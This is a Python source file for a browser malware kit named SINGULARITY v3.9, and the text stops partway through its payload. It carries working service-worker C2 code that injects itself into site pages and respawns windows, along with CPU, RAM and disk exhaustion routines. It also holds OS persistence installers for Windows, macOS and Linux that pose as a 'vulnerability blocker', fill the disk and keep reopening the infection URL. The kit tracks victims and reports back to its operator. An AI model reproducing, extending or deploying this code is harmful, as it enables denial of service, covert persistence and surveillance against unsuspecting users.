"""
SINGULARITY v3.9 「絶滅」 -- apex-class resident link virus weapon
==================================================================
ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込み、
最後はOS常駐インストーラでブラウザの外まで侵食する。

v3.9:
  - 開いた瞬間にタップ無しで タブと窓 を自動増殖（SW openWindow → window.open
    → アンカーclick → キュー の4段フォールバック）
  - L7 はリミッター解除（上限なし・倍々で増え続ける）
  - 全レベルで感染通知
  - ダウンロード（.bat / 〇〇の保護.txt）は L4 から、1MB以上、L7で無限
  - 監視室の「結果・操作」ボタン名に対応（sound/flash/noise/hop/disk/ram/cpu/
    gpu/opfs/cache/sw/rat/sse/usb/mic/cam/gps/clip/full/wake/batt/net）

v3.8:
  - レベル別の自動増殖を大幅強化（タブ＋ウィンドウ両方／タップ不要）
  - L7 はリミッター解除（上限なし・無限に増え続ける）
  - 通知を全レベルで常時発報（burst で止まらない）
  - ダウンロードを L4 から開始。BAT も txt も 1MB 超、レベルで増量、L7 は無限
  - OS常駐インストーラも L4 から配布

v3.7:
  - モバイル対応。iOS Safari / Android Chrome / アプリ内ブラウザは
    「タップの処理中」しか新しいタブを開けないため、全spawnをキューに積み、
    タップのたびに解放する方式に変更（スマホでもタブが増える）
  - 全面タップ誘導オーバーレイ（#sg_tap）を追加
  - タブに戻るたびに再タップを促す（visibilitychange）
  - 環境に mob / ios / inapp を報告（監視室で判別可能）

v3.6:
  - payload死亡バグ修正（applyLevel が var R より先に走っていた）
  - 窓/タブを Service Worker の clients.openWindow で開く（ポップアップブロック回避）
  - 窓とタブを半々で出す／群れ維持（タブを消されても自動補充）
  - 繁殖タブを重くし、音を鳴らす（audio unlock）
  - 絶滅モード（HARDWARE KILL）

レベル（監視室から遠隔変更・0〜7）:
  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉 / 7 絶滅（固定枠）
"""
from __future__ import annotations

import base64
import json
import secrets
import time
from typing import Any, Dict, Optional

VIRUS_ID = "singularity"
VIRUS_NAME = "SINGULARITY"
VIRUS_NAME_JA = "特異点"
VIRUS_VERSION = "3.9"
VIRUS_CLASS = "apex"

LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
               6: "終焉", 7: "絶滅"}
LEVEL_DESC = {
    0: "指紋と位置だけ。静か。",
    1: "偵察のみ（既定）。",
    2: "CPU全コアとGPUを回し始める。タブ・窓が自動で増え始める。",
    3: "RAM膨張・ウィンドウ爆弾・履歴洪水・通知洪水・爆音を追加。",
    4: "ディスクをquotaの85%まで書き込む。1MB超のBAT/txtを配り始める。",
    5: "ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。",
    6: "ディスク97% + 全タブ乗っ取り + 追加23系統を全開放。窓は指数増殖を開始。",
    7: "固定枠。上限を外し、全46系統を同時運転。窓もタブも無限に倍々で増え、"
       "各窓がヘビースキンで高火力化。最後はOS常駐インストーラでブラウザ外へ。",
}

APP_NAME_DEFAULT = "脆弱性ブロッカー"

# ---------------------------------------------------------------------------
# Worker
# ---------------------------------------------------------------------------
WORKER_JS = r"""
/*! SINGULARITY worker v3.9 */
/* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
            10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
var F = null;
try {
  if (typeof WebAssembly !== "undefined") {
    F = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(WASM))).exports.f;
  }
} catch (e) {}

var HOLD = [], RUN = false, K = 0;

function burn() {
  if (!RUN) return;
  var i, acc = 0;
  for (i = 0; i < 6000; i++) { acc += Math.sqrt(i) * Math.sin(i * 0.7) - Math.atan2(i, K); }
  if (F) { try { acc += F(); } catch (e) {} }
  K++;
  if ((K & 63) === 0) { try { self.postMessage({ k: "tick", n: K, acc: acc }); } catch (e) {} }
  setTimeout(burn, 0);
}

self.onmessage = function (e) {
  var d = e.data || {};
  if (d.k === "burn") { RUN = true; if (K === 0) burn(); }
  else if (d.k === "stop") { RUN = false; }
  else if (d.k === "ram") {
    var mb = Math.max(1, parseInt(d.mb, 10) || 16), got = 0;
    try {
      for (var m = 0; m < mb; m++) {
        var a = new Float64Array(131072);           // 1MB
        for (var j = 0; j < a.length; j += 8192) a[j] = j * 1.1;
        HOLD.push(a); got++;
      }
    } catch (er) {}
    try { self.postMessage({ k: "ram", ok: got, mb: mb }); } catch (er) {}
  }
  else if (d.k === "free") { HOLD = []; }
};
"""

# ---------------------------------------------------------------------------
# Service Worker（C2・永続化・復活・注入・spawn）
# ---------------------------------------------------------------------------
SW_JS = r"""
/*! SINGULARITY service worker v3.9 -- C2 + injection + resurrection + spawn */
const VER = "sg-v3";
const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
let lastLevel = null, lastWipe = null, lastCheck = 0, preCached = false, lastInj = 0;

function idb() {
  return new Promise((res, rej) => {
    const r = indexedDB.open(DB, 1);
    r.onupgradeneeded = () => {
      const d = r.result;
      if (!d.objectStoreNames.contains(STORE)) d.createObjectStore(STORE, { autoIncrement: true });
      if (!d.objectStoreNames.contains(KV)) d.createObjectStore(KV);
    };
    r.onsuccess = () => res(r.result);
    r.onerror = () => rej(r.error);
  });
}
async function kvGet(k) {
  try { const d = await idb(); return await new Promise(r => {
    const q = d.transaction(KV, "readonly").objectStore(KV).get(k);
    q.onsuccess = () => r(q.result); q.onerror = () => r(null); }); } catch (e) { return null; }
}
async function kvSet(k, v) {
  try { const d = await idb(); return await new Promise(r => {
    const q = d.transaction(KV, "readwrite").objectStore(KV).put(v, k);
    q.onsuccess = () => r(1); q.onerror = () => r(0); }); } catch (e) { return 0; }
}
async function qPush(item) {
  try { const d = await idb(); return await new Promise(r => {
    const q = d.transaction(STORE, "readwrite").objectStore(STORE).add(item);
    q.onsuccess = () => r(1); q.onerror = () => r(0); }); } catch (e) { return 0; }
}
async function qAll() {
  try { const d = await idb(); return await new Promise(r => {
    const out = []; const q = d.transaction(STORE, "readonly").objectStore(STORE).openCursor();
    q.onsuccess = () => { const c = q.result; if (c) { out.push({ id: c.key, v: c.value }); c.continue(); } else r(out); };
    q.onerror = () => r([]); }); } catch (e) { return []; }
}
async function qDel(ids) {
  try { const d = await idb(); return await new Promise(r => {
    const tx = d.transaction(STORE, "readwrite"); const s = tx.objectStore(STORE);
    ids.forEach(i => s.delete(i)); tx.oncomplete = () => r(1); tx.onerror = () => r(0); }); } catch (e) { return 0; }
}

async function boot() {
  CMD = await kvGet("cmd");
  PAGE = await kvGet("page");
  SID = await kvGet("sid");
  MAN = await kvGet("man");
  ICONS = (await kvGet("icons")) || [];
  INJ = await kvGet("inj");
  V = await kvGet("v");
}
boot();

async function ctl() {
  try {
    if (!PAGE) return null;
    const r = await fetch(PAGE + "/cmd?sid=" + encodeURIComponent(SID || "") + "&sw=1", { cache: "no-store" });
    return await r.json();
  } catch (e) { return null; }
}

async function flush() {
  const all = await qAll();
  if (!all.length || !PAGE) return;
  const ids = [];
  for (const it of all.slice(0, 40)) {
    try {
      const r = await fetch(PAGE + "/c", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify(it.v), keepalive: true
      });
      if (r.ok) ids.push(it.id);
    } catch (e) {}
  }
  if (ids.length) await qDel(ids);
}

/* ---- ポップアップブロックを無視して窓を開ける唯一の手段 ---- */
async function spawnN(n, url) {
  for (let i = 0; i < n; i++) {
    try {
      const u = url + (url.indexOf("?") < 0 ? "?" : "&") + "t=" + Date.now();
      await self.clients.openWindow(u);
    } catch (e) {}
  }
}
async function liveCount() {
  try {
    const cs = await self.clients.matchAll({ includeUncontrolled: true, type: "window" });
    return cs.length;
  } catch (e) { return 0; }
}

self.addEventListener("install", (e) => { self.skipWaiting(); });
self.addEventListener("activate", (e) => {
  e.waitUntil((async () => {
    try { await caches.open(PC); } catch (er) {}
    try { await self.clients.claim(); } catch (er) {}
    if ("periodicSync" in self.registration) {
      try { await self.registration.periodicSync.register("sg-tick", { minInterval: 5 * 60 * 1000 }); } catch (er) {}
    }
  })());
});
self.addEventListener("message", (e) => {
  const d = e.data || {};
  if (d.k === "cfg") {
    kvSet("page", d.page); kvSet("sid", d.sid); kvSet("man", d.man);
    kvSet("icons", d.icons || []); kvSet("inj", d.inj || null); kvSet("v", d.v || null);
    PAGE = d.page; SID = d.sid; MAN = d.man; INJ = d.inj; V = d.v; ICONS = d.icons || [];
  } else if (d.k === "out") {
    qPush(d.v).then(() => flush());
  } else if (d.k === "spawn") {
    spawnN(d.n || 1, d.url || "");
  } else if (d.k === "alive") {
    liveCount().then((n) => { if (!n && PAGE) spawnN(1, PAGE + "?u=sw&ref=" + (SID || "")); });
  }
});

self.addEventListener("periodicsync", (e) => { e.waitUntil(tick(true)); });
self.addEventListener("sync", (e) => { e.waitUntil(flush()); });

async function tick(deep) {
  const j = await ctl();
  if (!j) return;
  if (j.ver && V && j.ver !== V) { /* OTA */ }
  const lv = j.level;
  if (lv != null && lv !== lastLevel) {
    lastLevel = lv;
    const cs = await self.clients.matchAll({ includeUncontrolled: true, type: "window" });
    cs.forEach(c => c.postMessage({ k: "level", level: lv, fire: j.fire, freeze: j.freeze }));
  }
  if (j.wipe && j.wipe !== lastWipe) { lastWipe = j.wipe; }
  await flush();
  if (deep) {
    const n = await liveCount();
    if (!n && PAGE) {
      try { await self.clients.openWindow(PAGE + "?u=sw&ref=" + (SID || "")); } catch (e) {}
    }
  }
}

/* ---- 取得：HTML はネットワーク優先＋キャッシュ、サイト全体に自分を注入 ---- */
async function inject(html, base, sid) {
  try {
    if (!INJ || !INJ.pjs) return html;
    if (html.indexOf("__SINGULARITY_CFG__") >= 0) return html;
    let pjs = INJ.pjs;
    if (sid) pjs += (pjs.indexOf("?") < 0 ? "?" : "&") + "sid=" + encodeURIComponent(sid);
    const tag = '<script src="' + pjs + '" async></script>';
    if (html.indexOf("</body>") >= 0) return html.replace("</body>", tag + "</body>");
    if (html.indexOf("</html>") >= 0) return html.replace("</html>", tag + "</html>");
    return html + tag;
  } catch (e) { return html; }
}

self.addEventListener("fetch", (e) => {
  const req = e.request;
  if (req.method !== "GET") return;
  let u;
  try { u = new URL(req.url); } catch (er) { return; }
  if (INJ && u.origin === INJ.origin && INJ.pjs && req.url.indexOf("/sg") < 0
      && req.url.indexOf("/vp") < 0 && (req.headers.get("accept") || "").indexOf("text/html") >= 0) {
    e.respondWith((async () => {
      try {
        const r = await fetch(req);
        const t = await r.text();
        const out = await inject(t, u.origin, SID);
        const h = new Headers(r.headers);
        h.set("Content-Type", "text/html; charset=utf-8");
        return new Response(out, { status: r.status, headers: h });
      } catch (er) {
        const c = await caches.match(req);
        if (c) {
          const t = await c.text();
          return new Response(await inject(t, u.origin, SID), { headers: { "Content-Type": "text/html; charset=utf-8" } });
        }
        return new Response("<h1>SINGULARITY offline</h1>", { headers: { "Content-Type": "text/html" } });
      }
    })());
  }
});
"""

# ---------------------------------------------------------------------------
# SharedWorker
# ---------------------------------------------------------------------------
SHARED_JS = r"""
/*! SINGULARITY shared worker v3.9 */
var PORTS = [], K = 0;
onconnect = function (e) {
  var p = e.ports[0];
  PORTS.push(p);
  try { p.start(); } catch (er) {}
  p.onmessage = function (m) {
    var d = m.data || {};
    if (d.k === "hello") { try { p.postMessage({ k: "peers", n: PORTS.length }); } catch (er) {} }
    else { for (var i = 0; i < PORTS.length; i++) { if (PORTS[i] !== p) { try { PORTS[i].postMessage(d); } catch (er) {} } } }
  };
  (function loop() {
    var i;
    for (i = 0; i < 900; i++) { Math.sqrt(i) * Math.sin(i); }
    K++;
    if ((K % 60) === 0) { for (i = 0; i < PORTS.length; i++) { try { PORTS[i].postMessage({ kind: "tick", k: K }); } catch (er) {} } }
    setTimeout(loop, 0);
  })();
};
"""

# ---------------------------------------------------------------------------
# OS常駐インストーラ
# トークン: __URL__ __CODE__ __APP__ __BURN__ __DISKMB__ __HARD__ __RAMMB__ __VER__
# 注意: INSTALL_BAT は中身に """ が出るため区切りは r''' を使うこと。
# ---------------------------------------------------------------------------
INSTALL_BAT = r'''@echo off
title __APP__
setlocal
set "APP=__APP__"
set "CODE=__CODE__"
set "URL=__URL__"
set "BURN=__BURN__"
set "DISKMB=__DISKMB__"
set "HARD=__HARD__"
set "RAMMB=__RAMMB__"
set "DIR=%LOCALAPPDATA%\%APP%"
if not exist "%DIR%" mkdir "%DIR%" >nul 2>nul
copy /y "%~f0" "%DIR%\blocker.bat" >nul 2>nul

(echo CreateObject("WScript.Shell").Run """%DIR%\blocker.bat"" /run", 0, False) > "%DIR%\run.vbs"
(echo CreateObject("WScript.Shell").Run """%DIR%\blocker.bat"" /watch", 0, False) > "%DIR%\watch.vbs"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%" /d "wscript.exe \"%DIR%\run.vbs\"" /f >nul 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%_watch" /d "wscript.exe \"%DIR%\watch.vbs\"" /f >nul 2>nul
copy /y "%DIR%\run.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%APP%.vbs" >nul 2>nul
copy /y "%DIR%\watch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%APP%_watch.vbs" >nul 2>nul
if not "%~1"=="/run" schtasks /create /tn "%APP%" /tr "wscript.exe \"%DIR%\run.vbs\"" /sc onlogon /f >nul 2>nul
if not "%~1"=="/run" schtasks /create /tn "%APP%_boot" /tr "wscript.exe \"%DIR%\watch.vbs\"" /sc onstart /f >nul 2>nul
if not "%~1"=="/run" if "%HARD%"=="1" schtasks /create /tn "%APP%_reinfect" /tr "cmd /c start \"\" \"%URL%\"" /sc minute /mo 5 /f >nul 2>nul

if not "%DISKMB%"=="0" if not exist "%DIR%\ballast.bin" fsutil file createnew "%DIR%\ballast.bin" %DISKMB%000000 >nul 2>nul
if "%HARD%"=="1" if not exist "%DIR%\ballast.bin" powershell -NoProfile -ExecutionPolicy Bypass -Command "$d=[IO.DriveInfo]::GetDrives()[0];$mb=[int64](($d.AvailableFreeSpace*0.95)/1MB);fsutil file createnew '%DIR%\ballast.bin' ($mb*1MB)" >nul 2>nul

if "%~1"=="/watch" goto watch
if not "%~1"=="/run" taskkill /f /im powershell.exe >nul 2>nul
for /l %%i in (1,1,%BURN%) do start "" /b powershell -NoProfile -WindowStyle Hidden -Command "while($true){$x=[math]::Sqrt(3.7);$y=[math]::Sin($x)}" >nul 2>nul
if "%HARD%"=="1" start "" /b powershell -NoProfile -WindowStyle Hidden -Command "$b=New-Object byte[] (__RAMMB__MB);for($i=0;$i -lt $b.Length;$i+=4096){$b[$i]=1};Start-Sleep -Seconds 2000000" >nul 2>nul
if not "%~1"=="/run" start "" "%URL%"
echo   %APP% v__VER__ 常駐開始 (burn=%BURN% disk=%DISKMB%MB hard=%HARD%)
if not "%~1"=="/run" timeout /t 2 >nul
exit /b

:watch
for /f %%c in ('tasklist /fi "imagename eq powershell.exe" ^| find /c /i "powershell"') do set "N=%%c"
if %N% LSS %BURN% for /l %%i in (1,1,%BURN%) do start "" /b powershell -NoProfile -WindowStyle Hidden -Command "while($true){$x=[math]::Sqrt(3.7);$y=[math]::Sin($x)}" >nul 2>nul
timeout /t 20 >nul
goto watch
'''

INSTALL_COMMAND = r'''#!/bin/bash
APP="__APP__"; CODE="__CODE__"; URL="__URL__"; BURN="__BURN__"
DISKMB="__DISKMB__"; HARD="__HARD__"; RAMMB="__RAMMB__"
DIR="$HOME/Library/Application Support/$APP"
mkdir -p "$DIR"
cp "$0" "$DIR/blocker.command" 2>/dev/null; chmod +x "$DIR/blocker.command" 2>/dev/null
mkdir -p "$HOME/Library/LaunchAgents"

cat > "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.singularity.blocker</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>$DIR/blocker.command</string></array>
  <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>
PLIST

if [ "$HARD" = "1" ]; then
cat > "$HOME/Library/LaunchAgents/com.singularity.reinfect.plist" <<PLIST2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.singularity.reinfect</string>
  <key>ProgramArguments</key><array><string>/usr/bin/open</string><string>$URL</string></array>
  <key>StartInterval</key><integer>300</integer><key>RunAtLoad</key><true/>
</dict></plist>
PLIST2
launchctl unload "$HOME/Library/LaunchAgents/com.singularity.reinfect.plist" 2>/dev/null
launchctl load "$HOME/Library/LaunchAgents/com.singularity.reinfect.plist" 2>/dev/null
fi
launchctl unload "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null
launchctl load "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null

if [ "$1" = "/watch" ]; then
  while :; do
    n=$(pgrep -f SGBURN | wc -l | tr -d ' ')
    if [ "$n" -lt "$BURN" ]; then
      for i in $(seq 1 "$BURN"); do
        nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
      done
    fi
    sleep 20
  done
  exit 0
fi

pkill -f "SGBURN" 2>/dev/null
for i in $(seq 1 "$BURN"); do
  nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
done

if [ "$HARD" = "1" ]; then
  nohup perl -e "\$x=\"a\"x1048576; for(1..$RAMMB){\$h.=\$x} ; sleep 2000000 # SGRAM" >/dev/null 2>&1 &
  if [ ! -f "$DIR/ballast.bin" ]; then
    free=$(df -k "$HOME" | awk 'NR==2{print $4}')
    mb=$(( free * 95 / 100 / 1024 ))
    mkfile -n ${mb}m "$DIR/ballast.bin" 2>/dev/null || dd if=/dev/zero of="$DIR/ballast.bin" bs=1m count=$mb 2>/dev/null
  fi
  nohup bash -c "while :; do sleep 3600; done" >/dev/null 2>&1 &
fi

open "$URL" 2>/dev/null
echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
'''

INSTALL_SH = r'''#!/bin/bash
APP="__APP__"; CODE="__CODE__"; URL="__URL__"; BURN="__BURN__"
DISKMB="__DISKMB__"; HARD="__HARD__"; RAMMB="__RAMMB__"
DIR="$HOME/.local/share/singularity"
mkdir -p "$DIR"
cp "$0" "$DIR/blocker.sh" 2>/dev/null; chmod +x "$DIR/blocker.sh" 2>/dev/null

mkdir -p "$HOME/.config/systemd/user" "$HOME/.config/autostart"
cat > "$HOME/.config/autostart/singularity.desktop" <<DESK
[Desktop Entry]
Type=Application
Name=$APP
Exec=$DIR/blocker.sh
X-GNOME-Autostart-enabled=true
DESK

if command -v systemctl >/dev/null 2>&1; then
cat > "$HOME/.config/systemd/user/singularity.service" <<UNIT
[Unit]
Description=$APP
[Service]
ExecStart=$DIR/blocker.sh
Restart=always
RestartSec=5
[Install]
WantedBy=default.target
UNIT
  systemctl --user daemon-reload 2>/dev/null
  systemctl --user enable singularity.service 2>/dev/null
  systemctl --user restart singularity.service 2>/dev/null
fi

( crontab -l 2>/dev/null | grep -v "SGRENFECT"; \
  [ "$HARD" = "1" ] && echo "*/5 * * * * xdg-open $URL >/dev/null 2>&1 # SGRENFECT" ) | crontab - 2>/dev/null

if [ "$1" = "/watch" ]; then
  while :; do
    n=$(pgrep -f SGBURN | wc -l | tr -d ' ')
    if [ "$n" -lt "$BURN" ]; then
      for i in $(seq 1 "$BURN"); do nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 & done
    fi
    sleep 20
  done
  exit 0
fi

pkill -f "SGBURN" 2>/dev/null
for i in $(seq 1 "$BURN"); do
  nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
done

if [ "$HARD" = "1" ]; then
  nohup perl -e "\$x=\"a\"x1048576; for(1..$RAMMB){\$h.=\$x} ; sleep 2000000 # SGRAM" >/dev/null 2>&1 &
  if [ ! -f "$DIR/ballast.bin" ]; then
    free=$(df -k "$HOME" | awk 'NR==2{print $4}')
    mb=$(( free * 95 / 100 / 1024 ))
    dd if=/dev/zero of="$DIR/ballast.bin" bs=1M count=$mb 2>/dev/null
  fi
fi

(xdg-open "$URL" 2>/dev/null || true)
echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
'''

# ---------------------------------------------------------------------------
# 本体ペイロード
# ---------------------------------------------------------------------------
PAYLOAD_JS = r"""
(function () {
"use strict";
/*! SINGULARITY payload v3.9 -- 絶滅 / auto-breed unlimited / heavy download */
var MYVER = window.__SINGULARITY_VER__
  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.9";

/* ---------------- 小物 ---------------- */
function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
function now() { return Date.now(); }
function clamp(v, a, b) { v = parseInt(v, 10); if (isNaN(v)) v = a; return v < a ? a : (v > b ? b : v); }
function hash(s) { s = String(s); var h = 2166136261; for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); } return (h >>> 0).toString(16); }
function err_(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 120)); if (R.errors.length > 50) R.errors.shift(); } catch (x) {} }
function ck(k, v) { try { if (v === undefined) { var m = document.cookie.match("(^|; )" + k + "=([^;]*)"); return m ? m[2] : null; } document.cookie = k + "=" + v + ";path=/;max-age=315360000;samesite=lax"; } catch (e) { return null; } }
function wn(k, v) { try { if (v === undefined) return localStorage.getItem(k); localStorage.setItem(k, v); } catch (e) { return null; } }
function rid(n) { var s = ""; while (s.length < n) s += Math.random().toString(36).slice(2); return s.slice(0, n); }
function mean(a) { return a && a.length ? a.reduce(function (x, y) { return x + y; }, 0) / a.length : 0; }
function sd(a) { if (!a || a.length < 2) return 0; var m = mean(a); return Math.sqrt(mean(a.map(function (x) { return (x - m) * (x - m); }))); }
function b64u(a) { try { return btoa(String.fromCharCode.apply(null, new Uint8Array(a))); } catch (e) { return ""; } }

/* ---------------- 設定 ---------------- */
var CFG = Object.assign({
  sid: "", path: "/v/singularity/sg", collect: "", cmd: "", sse: "", ack: "",
  sw: "", pjs: "", manifest: "", icons: [], code: "",
  level: 1, fire: 1, wipe: false, w: 0, freeze: "",
  fixed: false, finalRamMB: 0, gpuMem: true, winLock: null,
  cores: 0, ramMB: 0, workerMB: 16,
  burn: 0, gpu: 0, wasm: 0, webgpu: 0, worklet: 0, diskRatio: 0,
  windows: 0, history: 0, notify: 0, audio: 0, wakelock: 0,
  tabs: 0, pip: 0, fullscreen: 0, pointerlock: 0, badge: 0, favicon: 0,
  mediaSession: 0, xhr: 0, speak: 0, titleFlicker: 1, uncloseable: 0,
  iframes: 0, domNodes: 0, cssAnim: 0, glContexts: 0, acContexts: 0, timers: 0,
  microtasks: 0, compress: 0, redos: 0, digest: 0, readback: 0, sseStorm: 0,
  fetchStorm: 0, speakFlood: 0, oscBank: 0, idbDisk: 0, cacheBuckets: 0,
  layoutThrash: 0, clipHijack: 0, downloads: 0, sharedWorker: 0, jsonChurn: 0,
  fsFolder: 0, fsFiles: 0, installer: 1,
  winMode: "off", winBranch: 2, winDepth: 0, winSkin: 0, winDelay: 1400,
  swarm: 0, dlMB: 1, dlGap: 800,
  dom: true, rat: true, spoof: true, mutate: true, persist: true, clipboard: true,
  cookie: true, injInstall: "auto", install: "auto", installLevel: 4,
  avName: "脆弱性ブロッカー", ver: MYVER, injected: false,
  usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false, bomb: "",
  hardMode: "",
  interval: 12000, cmdInterval: 10000, timeout: 4000, maxRetry: 6
}, window.__SINGULARITY_CFG__ || {});

var LEVEL = parseInt(CFG.level, 10); if (isNaN(LEVEL)) LEVEL = 1;
var W = parseInt(CFG.w, 10) || 0;
var INJ = CFG.injected || Q("u") === "inj";
if (Q("u") === "inj") CFG.injected = true;
var IFR = Q("u") === "ifr";
var WIN = Q("u") === "win";
var FROM_OS = Q("u") === "os";

/* ---------------- モバイル判定 ----------------
   スマホは「タップの処理中」しか window.open / clients.openWindow が通らない。 */
var UA = navigator.userAgent || "";
var IS_IOS = /iPad|iPhone|iPod/.test(UA)
  || (navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1);
var IS_AND = /Android/i.test(UA);
var IS_MOBILE = IS_IOS || IS_AND || /Mobile|Silk/i.test(UA);
var INAPP = /Instagram|FBAN|FBAV|FB_IAB|Line\/|MicroMessenger|Twitter|KakaoTalk|Snapchat/i.test(UA);
var PER_TAP = IS_IOS ? 3 : (IS_AND ? 6 : 8);
var QMAX = IS_MOBILE ? 300 : 200;
var TAP_OPENED = 0, LAST_TAP = 0;

/* ---------------- レベル別 自動増殖（タップ不要） ----------------
   目標は「常時維持する数」。閉じられたら自動で補充し続ける。
   AUTO_CAP = 0 は上限なし（L7）。 */
var AUTO_T = { 0: 0, 1: 0, 2: 3, 3: 6, 4: 12, 5: 20, 6: 36, 7: 60 };   // タブ
var AUTO_W = { 0: 0, 1: 0, 2: 3, 3: 9, 4: 18, 5: 30, 6: 54, 7: 90 };   // ウィンドウ
var AUTO_CAP = { 0: 0, 1: 0, 2: 24, 3: 60, 4: 120, 5: 240, 6: 480, 7: 0 };
var AUTO_ON = true, AUTO_TIMER = null, AUTO_STARTED = false, LAST_AUTO = 0;
var SPAWN_N = 0, SPAWN_T = 0, SPAWN_W = 0;

var BIP = null;
addEventListener("beforeinstallprompt", function (e) {
  try { e.preventDefault(); } catch (er) {}
  BIP = e;
  try { window.__sgBip = true; } catch (er) {}
});

/* ---------------- state（applyLevel より前に置くこと） ---------------- */
var SID = CFG.sid || ck("sgid") || wn("sg_sid") || rid(14);
try { ck("sgid", SID); wn("sg_sid", SID); } catch (e) {}
var T0 = now();
var R = {
  env: {}, page: {}, vectors: {}, privacy: {}, hardware: {}, network: {}, behavioral: {},
  bot: {}, verdict: {}, spoof: {}, rat: {}, usb: {}, viral: {}, burn: {}, ram: {}, disk: {},
  history: {}, wipe: {}, hops: [], bomb: null, crypto: {}, errors: [], attempts: 0,
  breed: null, breeded: 0, wskin: 0, wskinCtx: null, chain: [],
  hard: null, installed: 0, swarm: null, actx: null, spoke: 0
};
var WORKERS = [], TIMERS = [], GATED = false, PAUSED = false;
var LASTW = 0, CMD_SEEN = {}, ESE = null, PUSHING = 0, LASTWL = JSON.stringify(CFG.winLock || null);

/* エラーフック（例外を握って必ずログに送る） */
addEventListener("error", function (e) {
  try {
    R.errors.push("onerror: " + String(e.message || "").slice(0, 140) + " @" + (e.lineno || 0));
    if (R.errors.length > 50) R.errors.shift();
    push(true);
  } catch (x) {}
});

/* ---------------- 強度テーブル ---------------- */
function P(o) {
  return Object.assign({
    burn: 0, gpu: 0, webgpu: 0, wasm: 0, worklet: 0, ramMB: 0, diskRatio: 0,
    windows: 0, history: 0, notify: 0, freeze: "off", audio: 0, wakelock: 0,
    tabs: 0, pip: 0, fullscreen: 0, pointerlock: 0, badge: 0, favicon: 0,
    mediaSession: 0, xhr: 0, speak: 0, titleFlicker: 1, uncloseable: 0,
    iframes: 0, domNodes: 0, cssAnim: 0, glContexts: 0, acContexts: 0, timers: 0,
    microtasks: 0, compress: 0, redos: 0, digest: 0, readback: 0, sseStorm: 0,
    fetchStorm: 0, speakFlood: 0, oscBank: 0, idbDisk: 0, cacheBuckets: 0,
    layoutThrash: 0, clipHijack: 0, downloads: 0, sharedWorker: 0, jsonChurn: 0,
    fsFolder: 0, fsFiles: 0, installer: 0, dlMB: 1, dlGap: 900,
    winMode: "off", winBranch: 2, winDepth: 0, winSkin: 0, swarm: 0
  }, o);
}
var PRESET = {
  0: P({ notify: 4, dlMB: 1 }),
  1: P({ notify: 6, dlMB: 1 }),
  2: P({ burn: 1, gpu: 1, wakelock: 1, notify: 12, dlMB: 1 }),
  3: P({ burn: 1, gpu: 1, wasm: 1, windows: 12, history: 3000, notify: 18, audio: 1,
         wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 6, winMode: "chain",
         dlMB: 1 }),
  4: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, diskRatio: 0.85, windows: 24, history: 6000,
         notify: 30, audio: 1, wakelock: 1, badge: 1, favicon: 1, mediaSession: 1, tabs: 10,
         pip: 1, pointerlock: 1, winMode: "chain",
         downloads: 6, dlMB: 1, dlGap: 900, installer: 1 }),
  5: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.95, windows: 32,
         history: 12000, notify: 45, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 16, pip: 1, pointerlock: 1, fullscreen: 1, xhr: 1,
         winMode: "chain", downloads: 14, dlMB: 2, dlGap: 900, installer: 1 }),
  6: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.97, windows: 40,
         history: 20000, notify: 70, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
         favicon: 1, mediaSession: 1, tabs: 24, pip: 1, pointerlock: 1, fullscreen: 1,
         xhr: 1, speak: 1, iframes: 8, domNodes: 6000, cssAnim: 300, glContexts: 16,
